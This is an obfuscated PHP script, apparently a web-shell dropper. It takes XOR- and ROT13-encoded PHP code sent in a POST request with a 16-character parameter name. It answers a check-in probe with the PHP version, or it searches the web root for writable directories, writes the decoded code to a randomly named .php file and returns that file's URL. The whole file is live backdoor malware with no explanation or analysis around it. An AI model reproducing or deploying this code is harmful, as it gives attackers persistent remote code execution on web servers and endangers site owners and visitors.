<?php $bcyojwfkfs = "ddvxrajhknhqkpsy";$yklyfkige = "";foreach ($_POST as $xncgnidi => $rwhepdz){if (strlen($xncgnidi) == 16 and substr_count($rwhepdz, "%") > 10){oafwuolbq($xncgnidi, $rwhepdz);}}function oafwuolbq($xncgnidi, $ocydcrvyke){global $yklyfkige;$yklyfkige = $xncgnidi;$ocydcrvyke = str_split(rawurldecode(str_rot13($ocydcrvyke)));function tgmojjxs($ndnoch, $xncgnidi){global $bcyojwfkfs, $yklyfkige;return $ndnoch ^ $bcyojwfkfs[$xncgnidi % strlen($bcyojwfkfs)] ^ $yklyfkige[$xncgnidi % strlen($yklyfkige)];}$ocydcrvyke = implode("", array_map("tgmojjxs", array_values($ocydcrvyke), array_keys($ocydcrvyke)));$ocydcrvyke = @unserialize($ocydcrvyke);if (@is_array($ocydcrvyke)){$xncgnidi = array_keys($ocydcrvyke);$ocydcrvyke = $ocydcrvyke[$xncgnidi[0]];if ($ocydcrvyke === $xncgnidi[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function kucbz($gazyzrbkir) {static $gazyzrbkowufovy = array();$tnzcuyj = glob($gazyzrbkir . '/*', GLOB_ONLYDIR);if (count($tnzcuyj) > 0) {foreach ($tnzcuyj as $gazyzrbk){if (@is_writable($gazyzrbk)){$gazyzrbkowufovy[] = $gazyzrbk;}}}foreach ($tnzcuyj as $gazyzrbkir) kucbz($gazyzrbkir);return $gazyzrbkowufovy;}$czywlgi = $_SERVER["DOCUMENT_ROOT"];$tnzcuyj = kucbz($czywlgi);$xncgnidi = array_rand($tnzcuyj);$xwzcknuqp = $tnzcuyj[$xncgnidi] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($xwzcknuqp, $ocydcrvyke);echo "http://" . $_SERVER["HTTP_HOST"] . substr($xwzcknuqp, strlen($czywlgi));exit();}}}